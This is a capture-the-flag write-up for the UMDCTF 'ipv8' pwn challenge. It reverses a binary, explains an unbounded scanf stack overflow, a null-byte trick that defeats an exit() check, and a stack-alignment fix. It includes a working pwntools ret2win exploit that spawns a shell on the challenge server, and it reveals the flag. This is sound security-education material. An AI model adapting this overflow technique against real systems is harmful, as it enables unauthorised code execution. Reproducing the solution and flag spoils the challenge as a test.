# UMDCTF

# Pwn/ ipv8

> whats better than ipv9? ipv8 (backwards compatible) ofc!
`nc challs.umdctf.io 30308`
> 

## tl;dr

ret2win with a twist - you need a buffer overflow on the source address field to smash the return address, but there’s a roadblock: a hardcoded `"0.0.0.0"` string that triggers `exit()` before you ever reach `ret`. You use a second, bounded input to  place a null byte on top of that string so execution falls through, stack alignment issue on top of that.

## First look

We get a single binary, `ipv4`.

```
$ file ipv4
ipv4: ELF 64-bit LSB executable, x86-64, statically linked, not stripped

$ checksec ipv4
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Statically linked, not stripped, no PIE. checksec claims there’s a canary, but that just means the binary was compiled with `-fstack-protector` - it doesn’t guarantee every function uses one. We’ll check `main` specifically in a sec.

I connected to the service to see what it actually does:

```
$ nc challs.umdctf.io 30308
IPv8 is the future! As someone with an ipv4 address, luckily ipv8 is backwards compatible!
What is your Source ASN Prefix?
> 1234
Sorry, you don't get to set that silly! This is for ipv8 only!
What is your Source Host Address?
> 1.2.3.4
What is your Destination ASN Prefix?
> 5678
Sorry, you don't get to set that silly! This is for ipv8 only!
What is your Destination Host Address?
> 5.6.7.8
Wrong RINE address!! Perhaps you were looking for 100.72.7.67
```

So it’s pretending to build some kind of IPv8 packet header. It asks for four things - source prefix, source host, dest prefix, dest host. The ASN prefix inputs get ignored. The host address inputs seem to get validated. At the end it complains about a “RINE address.” Alright, time to throw it in `Binary Ninja`.

## Reversing

The binary isn’t stripped, so the symbol table is our friend. Running `nm` and filtering out the standard library noise, three functions stand out right next to `main`:

```
0x402f45  win
0x402f5b  check_valid_address
0x402f97  check_rine
0x403018  main
```

A function literally named `win`. 

### win

Tiny function. Opens a shell:

```c
uint64_t win()
return __libc_system("/bin/sh")
```

That’s our target. we need to redirect the execution here.

### check_valid_address

This one takes a string and walks through it character by character, counting dots. If there are exactly 3 dots, it returns 0 (valid). Otherwise non-zero (invalid). so basically checking if it looks like an IPv4 address, it doesn’t validate the octets or anything, just counts periods.

Both host address inputs go through this check. Our payloads will need to contain exactly 3 `.` characters to not get rejected.

### check_rine

This is the gatekeeper. Pseudocode:

```c
void check_rine(char *addr) {
    if (strcmp(addr, "0.0.0.0") == 0) {
        puts("Sorry, we want devices using ipv8 only...");
        exit(1);    // hard exit, no coming back
    }
    if (strcmp(addr, "100.72.7.67") == 0) {
        puts("Welcome in our beloved ipv8 address");
        win();      // shell!
    } else {
        puts("Wrong RINE address!! Perhaps you were looking for 100.72.7.67");
        // just returns, doesn't exit
    }
}
```

Three paths:
1. Input is `"0.0.0.0"` - process dies. Bad.
2. Input  `"100.72.7.67"`  calls `win()`.
3. Anything else prints an error and returns normally. Interesting.

That third path is key. If `check_rine` gets a string that isn’t `"0.0.0.0"`, it doesn’t kill the process. It just returns, and `main` continues to its `ret` instruction.

### main

Here’s where I spent most of my time. The prologue:

```nasm
push   rbp
mov    rbp, rsp
sub    rsp, 0xc0
```

No `mov rax, fs:0x28` so no canary in this function. checksec lied to us (well, it didn’t, the binary *has* canary support, `main` just doesn’t use it). That means we can overflow without tripping a canary check.

I mapped out the stack by tracing the `lea` instructions before each `scanf` call and the `movabs` that initializes the hardcoded strings. The layout from low to high:

```
[rbp - 0xc0]  Destination host buffer     scanf("%48s", ...) - max 48 chars
              (48 bytes)
[rbp - 0x90]  "0.0.0.0"                   initialized by main, passed to check_rine
              (8 bytes)
              (40 bytes of unused space)
[rbp - 0x60]  Source host buffer           scanf("%s", ...) — UNBOUNDED
              (48 bytes)
[rbp - 0x30]  "0.0.0.0"                   another copy, never actually used
              (48 bytes of space up to rbp)
[rbp + 0x00]  Saved RBP
[rbp + 0x08]  Return address
```

The execution flow:

1. `scanf("%*s")` reads the source ASN prefix and throws it away (`%*s` means read but don’t store)
2. `scanf("%s", rbp-0x60)`  reads source host address. No size limit. This is the bug.
3. `check_valid_address(rbp-0x60)` needs 3 dots or we get kicked out
4. `scanf("%*s")`  reads dest ASN prefix, also thrown away
5. `scanf("%48s", rbp-0xc0)`  reads dest host address. Capped at 48 characters.
6. `check_valid_address(rbp-0xc0)` again needs 3 dots
7. `check_rine(rbp-0x90)`  checks the hardcoded `"0.0.0.0"` string. We don’t control this argument directly.

The `%s` at step 2 is the vulnerability. No bounds checking at all. But the `%48s` at step 5 is interesting too , that 48-character limit is *suspiciously* convenient given the stack layout.

## Putting it together

I need two things to happen:

**Problem 1: `check_rine` will call `exit(1)`**

`main` initializes `[rbp-0x90]` to `"0.0.0.0"` and passes it to `check_rine`. That matches the first `strcmp`, which calls `exit(1)`. The process dies. We never reach `main`’s `ret` instruction, so even if we’ve overwritten the return address, it doesn’t matter. We need to corrupt that `"0.0.0.0"` string.

Look at the distances: the dest host buffer starts at `[rbp-0xc0]` and the `"0.0.0.0"` string is at `[rbp-0x90]`. That’s `0xc0 - 0x90 = 0x30 = 48 bytes` apart. And `scanf("%48s")` reads up to… 48 characters. After the last character, `scanf` always writes a null terminator (`\0`). So if I feed it exactly 48 characters, the data fills from `[rbp-0xc0]` through `[rbp-0x91]`, and the null byte lands squarely on `[rbp-0x90]` - the first character of `"0.0.0.0"`.

That turns `"0.0.0.0"` into `""` (empty string). Now `check_rine` gets `""`:
- `strcmp("", "0.0.0.0")` - not equal so no `exit()`
- `strcmp("", "100.72.7.67")` - not equal so prints “Wrong RINE address!!” and returns

And returning is exactly what we want. `main` reaches `ret`.

**Problem 2: `main` returns to the wrong place**

Now I need to hijack where `ret` goes. The source host buffer at `[rbp-0x60]` is read with `%s`  no limit. Writing upward from there:

- 96 bytes gets us from the buffer to the saved RBP at `[rbp+0x00]`
- 8 more bytes overwrites the saved RBP
- The next 8 bytes is the return address at `[rbp+0x08]`

Total padding: 104 bytes, then the address of `win`.

Both payloads need exactly 3 dots to pass `check_valid_address`. Easy enough, I just stick the dots somewhere in the padding.

## The alignment pain

I wrote the first version, ran it, and… got EOF. No shell. The program jumped to `win`, but `system()` segfaulted.

This one bit me for a minute before I realized: stack alignment.

The x86-64 ABI requires RSP to be 16-byte aligned before a `call` instruction. When you normally `call` a function, the `call` itself pushes the return address (8 bytes), so at the function entry point RSP is at 8 mod 16. The function’s prologue (`push rbp`) then brings it back to 0 mod 16. Everything is balanced.

But we’re not *calling* `win` , we’re *returning* into it. `ret` pops 8 bytes (the return address) instead of pushing. So the alignment is flipped. When `win` does `push rbp` and then `call system`, the stack ends up misaligned by 8 bytes. `system()` uses SSE instructions internally (`movaps`) that require 16-byte alignment, and it segfaults.

The fix: instead of returning to the start of `win` (`0x402f45`), return to `win+4` (`0x402f49`), which skips the `push rbp; mov rbp, rsp` prologue and goes straight to the `lea`/`call system` sequence. Without the extra `push`, the alignment works out:

```
main's ret:    RSP = 0 mod 16 (aligned)
               jumps to win+4
               (no push rbp)
call system:   pushes return addr, RSP = 8 mod 16 at entry ✓
```

## Exploit

```python
from pwn import *

context.arch = 'amd64'

win = 0x402f49  # win+4

src = b'A' * 101 + b'...' + p64(win)[:3]

dst = b'A' * 45 + b'...'

r = remote('challs.umdctf.io', 30308)

r.sendlineafter(b'> ', b'asdf')
r.sendlineafter(b'> ', src)
r.sendlineafter(b'> ', b'asdf')
r.sendlineafter(b'> ', dst)

r.sendline(b'cat flag*')
r.interactive()
```

A note on the source payload: `p64(win)[:3]` gives us the first three bytes of `0x402f49` in little-endian. We only need to write three bytes because the original return address (somewhere in the 0x40XXXX range) already has `\x00` in its upper bytes. `scanf`’s null terminator covers the fourth byte. The remaining four bytes stay as `\x00` from the original value. End result: the return address is exactly `0x0000000000402f49`.

```
$ python3 ye.py
[+] Opening connection to challs.umdctf.io on port 30308: Done
[*] Switching to interactive mode
Wrong RINE address!! Perhaps you were looking for 100.72.7.67
UMDCTF{why_was_ipv9_afraid_of_ipv7?ipv789}
```

The “Wrong RINE address!!” confirms our null byte trick worked -`check_rine` got an empty string, didn’t match either hardcoded IP, printed the error, and returned. Then `main` hit `ret`, popped our overwritten address, jumped to `win+4`, and `system("/bin/sh")` gave us a shell.

## Flag

`UMDCTF{why_was_ipv9_afraid_of_ipv7?ipv789}`